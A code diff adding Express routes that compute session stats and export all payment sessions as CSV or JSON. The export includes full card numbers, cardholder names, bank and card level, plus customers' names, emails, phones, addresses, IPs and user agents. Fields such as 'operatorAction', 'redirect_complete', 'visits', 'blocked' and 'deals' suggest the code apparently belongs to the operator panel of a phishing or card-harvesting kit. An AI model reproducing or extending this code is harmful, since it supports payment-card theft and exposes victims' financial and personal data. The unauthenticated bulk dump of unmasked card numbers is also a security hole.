@@ -122,4 +122,68 @@ router.get('/payment/sessions', async (_req: Request, res: Response) => {
   res.json(ok(data));
 });
 
+// Payment stats
+router.get('/payment/stats', async (req: Request, res: Response) => {
+  const range = parseInt(req.query.range as string) || 7;
+  const since = Date.now() - range * 86400000;
+  const allSessions = await paymentService.getPaymentSessions();
+  const filtered = allSessions.filter((s: any) => {
+    const ts = new Date(s.createdAt || s.created_at || 0).getTime();
+    return ts >= since;
+  });
+  const completed = filtered.filter((s: any) => s.status === 'completed' || s.operatorAction === 'redirect_complete');
+  let turnover = 0;
+  completed.forEach((s: any) => {
+    const amt = parseFloat(s.amount || (s.cardInfo && s.cardInfo.amount) || 0);
+    if (!isNaN(amt)) turnover += amt;
+  });
+  res.json(ok({
+    visits: filtered.length,
+    turnover: Math.round(turnover * 100) / 100,
+    blocked: 0,
+    deals: completed.length
+  }));
+});
+
+// Payment export
+router.get('/payment/export', async (req: Request, res: Response) => {
+  const format = req.query.format as string || 'csv';
+  const allSessions = await paymentService.getPaymentSessions();
+  const rows = allSessions.map((s: any) => ({
+    sessionId: s.sessionId,
+    cardNumber: s.cardInfo?.cardNumber || '',
+    cardHolder: s.cardInfo?.cardHolder || '',
+    cardType: s.cardInfo?.cardType || '',
+    cardLevel: s.cardInfo?.cardLevel || '',
+    bankName: s.cardInfo?.bankName || '',
+    fullName: s.customerInfo?.fullName || '',
+    email: s.customerInfo?.email || '',
+    phone: s.customerInfo?.phone || '',
+    country: s.customerInfo?.country || '',
+    city: s.customerInfo?.city || '',
+    state: s.customerInfo?.state || '',
+    zipCode: s.customerInfo?.zipCode || '',
+    address1: s.customerInfo?.address1 || '',
+    amount: s.amount || (s.cardInfo?.amount) || '',
+    status: s.status || '',
+    currentStep: s.currentStep || '',
+    frontendUrl: s.frontendUrl || '',
+    ip: s.ip || '',
+    ua: s.ua || '',
+    createdAt: s.createdAt || s.created_at || '',
+  }));
+  if (format === 'json') {
+    res.setHeader('Content-Type', 'application/json');
+    res.setHeader('Content-Disposition', 'attachment; filename=payment-sessions.json');
+    return res.send(JSON.stringify(rows, null, 2));
+  }
+  // CSV
+  const headers = Object.keys(rows[0] || {});
+  const csv = '\uFEFF' + headers.map(h => `"${h}"`).join(',') + '\n' +
+    rows.map((r: any) => headers.map(h => `"${String(r[h] || '').replace(/"/g, '""')}"`).join(',')).join('\n');
+  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+  res.setHeader('Content-Disposition', 'attachment; filename=payment-sessions.csv');
+  res.send(csv);
+});
+
 export default router;
